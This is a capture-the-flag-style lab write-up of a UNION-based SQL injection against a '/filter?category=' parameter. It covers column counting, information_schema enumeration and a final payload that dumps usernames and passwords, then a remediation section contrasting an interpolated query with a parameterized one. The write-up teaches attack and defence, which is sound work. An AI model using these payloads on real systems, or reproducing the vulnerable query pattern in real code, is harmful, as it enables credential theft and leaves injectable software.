# Lab: SQL injection attack, listing the database contents on non-Oracle databases

## 1. Vulnerability Discovery & Enumeration (The Analysis)
* **Target Endpoint / Parameter:** `/filter?category=xyz`
* **Vulnerability Type:** Server-Side (SQL Injection - UNION Based)
* **Target Database Infrastructure:** Non-Oracle (MySQL / PostgreSQL)

### Step 1: Mapping Column Count via Structural Ordering
To execute a successful `UNION`-based data extraction layout, I first determined the exact column boundary of the primary query layout.
* `category=xyz' ORDER BY 1-- ` -> HTTP 200 OK
* `category=xyz' ORDER BY 2-- ` -> HTTP 200 OK
* `category=xyz' ORDER BY 3-- ` -> HTTP 500 Internal Server Error

**Deduction:** The database architecture expects exactly **2 columns**.

### Step 2: Mapping Data Type Compatibility
I validated if both column slots cleanly process string payloads by injecting standalone text parameters:
* Payload: `category=xyz' UNION SELECT 'abc', 'def'-- ` -> HTTP 200 OK

**Deduction:** The layout supports arbitrary string values across both available query slots.

### Step 3: Enumerating Obfuscated Schema Structures (The Table Hunt)
Because target table names are randomly obfuscated at runtime, I queried the database's master metadata directory (`information_schema.tables`) to find hidden application containers:
* Payload: `category=xyz' UNION SELECT table_name, NULL FROM information_schema.tables-- `

**Discovered Target Table:** `users_xmaitw`

### Step 4: Enumerating Structural Field Headers (The Column Hunt)
With the hidden table string isolated, I queried the `information_schema.columns` directory to discover the precise text headers where application credentials live:
* Payload: `category=xyz' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_xmaitw'-- `

**Discovered Target Columns:** 
* `username_eouwsc`
* `password_wortii`

## 2. Exploitation & Exfiltration (The Hack)
* **Payload Used:** `' UNION SELECT username_eouwsc, password_wortii FROM users_xmaitw-- `
* **Full URL Encoded Input:** `/filter?category=xyz'+UNION+SELECT+username_eouwsc,+password_wortii+FROM+users_xmaitw--+`
* **Mechanism:** 
  1. Setting an arbitrary category value (`xyz`) forces the original product search logic to yield 0 results, ensuring the web application layout *only* iterates over and prints our injected data payload lines.
  2. The `UNION SELECT` statement requests the custom username and password columns side-by-side.
  3. The table width matches the necessary 2-column layout exactly.
  4. The comment boundary (`-- `) drops trailing runtime code components to prevent query crashes.
* **Result:** The database dumped administrative application credentials directly into the front-end browser HTML templates, enabling an authentication takeover as the `administrator` user.

## 3. Remediation (The Fix)
* **Flawed Concept:** The application parses raw client-side HTTP request strings and processes them directly as trusted structural query segments.
* **The Correction:** Implement strict separation of code and data architectures utilizing **Prepared Statements (Parameterized Queries)**.

### Vulnerable Code Example (Conceptual Backend Context)
```javascript
const category = req.query.category;
// Vulnerable: Runtime variable interpolation allows query structure manipulation
const query = `SELECT name, description FROM products WHERE category = '${category}'`;
db.query(query);
```

### Secure Remediation Example (Parameterized Validation)
```javascript
const category = req.query.category;
// Secure: Explicit separation ensures user input is strictly parsed as data strings, never code
const query = 'SELECT name, description FROM products WHERE category = \$1';
db.query(query, [category]);
```
